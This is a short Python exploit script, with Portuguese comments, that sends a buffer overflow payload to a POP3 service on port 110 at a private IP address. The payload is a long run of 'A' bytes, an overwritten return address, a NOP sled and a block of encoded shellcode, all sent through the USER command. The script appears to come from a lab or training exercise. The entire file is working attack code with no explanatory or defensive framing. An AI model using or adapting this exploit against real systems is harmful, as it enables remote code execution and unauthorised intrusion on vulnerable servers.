#!/usr/bin/python
# -*- coding: utf-8 -*-
import socket,time

buf = "A" * 5094

eip = "\xF9\x24\x9E\x0F"

NOPS = "\x90" * 20

shellcode =  b""
shellcode += b"\xbe\x2c\xd6\xec\x76\xdb\xc9\xd9\x74\x24\xf4"
shellcode += b"\x5a\x33\xc9\xb1\x52\x83\xea\xfc\x31\x72\x0e"
shellcode += b"\x03\x5e\xd8\x0e\x83\x62\x0c\x4c\x6c\x9a\xcd"
shellcode += b"\x31\xe4\x7f\xfc\x71\x92\xf4\xaf\x41\xd0\x58"
shellcode += b"\x5c\x29\xb4\x48\xd7\x5f\x11\x7f\x50\xd5\x47"
shellcode += b"\x4e\x61\x46\xbb\xd1\xe1\x95\xe8\x31\xdb\x55"
shellcode += b"\xfd\x30\x1c\x8b\x0c\x60\xf5\xc7\xa3\x94\x72"
shellcode += b"\x9d\x7f\x1f\xc8\x33\xf8\xfc\x99\x32\x29\x53"
shellcode += b"\x91\x6c\xe9\x52\x76\x05\xa0\x4c\x9b\x20\x7a"
shellcode += b"\xe7\x6f\xde\x7d\x21\xbe\x1f\xd1\x0c\x0e\xd2"
shellcode += b"\x2b\x49\xa9\x0d\x5e\xa3\xc9\xb0\x59\x70\xb3"
shellcode += b"\x6e\xef\x62\x13\xe4\x57\x4e\xa5\x29\x01\x05"
shellcode += b"\xa9\x86\x45\x41\xae\x19\x89\xfa\xca\x92\x2c"
shellcode += b"\x2c\x5b\xe0\x0a\xe8\x07\xb2\x33\xa9\xed\x15"
shellcode += b"\x4b\xa9\x4d\xc9\xe9\xa2\x60\x1e\x80\xe9\xec"
shellcode += b"\xd3\xa9\x11\xed\x7b\xb9\x62\xdf\x24\x11\xec"
shellcode += b"\x53\xac\xbf\xeb\x94\x87\x78\x63\x6b\x28\x79"
shellcode += b"\xaa\xa8\x7c\x29\xc4\x19\xfd\xa2\x14\xa5\x28"
shellcode += b"\x64\x44\x09\x83\xc5\x34\xe9\x73\xae\x5e\xe6"
shellcode += b"\xac\xce\x61\x2c\xc5\x65\x98\xa7\x2a\xd1\xc6"
shellcode += b"\x33\xc3\x20\x06\x3c\x0a\xac\xe0\x56\x3c\xf8"
shellcode += b"\xbb\xce\xa5\xa1\x37\x6e\x29\x7c\x32\xb0\xa1"
shellcode += b"\x73\xc3\x7f\x42\xf9\xd7\xe8\xa2\xb4\x85\xbf"
shellcode += b"\xbd\x62\xa1\x5c\x2f\xe9\x31\x2a\x4c\xa6\x66"
shellcode += b"\x7b\xa2\xbf\xe2\x91\x9d\x69\x10\x68\x7b\x51"
shellcode += b"\x90\xb7\xb8\x5c\x19\x35\x84\x7a\x09\x83\x05"
shellcode += b"\xc7\x7d\x5b\x50\x91\x2b\x1d\x0a\x53\x85\xf7"
shellcode += b"\xe1\x3d\x41\x81\xc9\xfd\x17\x8e\x07\x88\xf7"
shellcode += b"\x3f\xfe\xcd\x08\x8f\x96\xd9\x71\xed\x06\x25"
shellcode += b"\xa8\xb5\x27\xc4\x78\xc0\xcf\x51\xe9\x69\x92"
shellcode += b"\x61\xc4\xae\xab\xe1\xec\x4e\x48\xf9\x85\x4b"
shellcode += b"\x14\xbd\x76\x26\x05\x28\x78\x95\x26\x79"


payload = buf + eip + NOPS + shellcode

# Incrementa a variável "fuzz" adicionando 200 "A" até que a Aplicacao quebre
#fuzz += "A" * 200

print("Enviando {} bytes para tentar quebrar a aplicacao".format(len(buf)))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(("192.168.100.5", 110))
s.recv(1024)

s.send(b"USER " + payload + b"\r\n")
print (s.recv(1024))
s.send(b"QUIT\r\n")
s.close()
time.sleep(1)
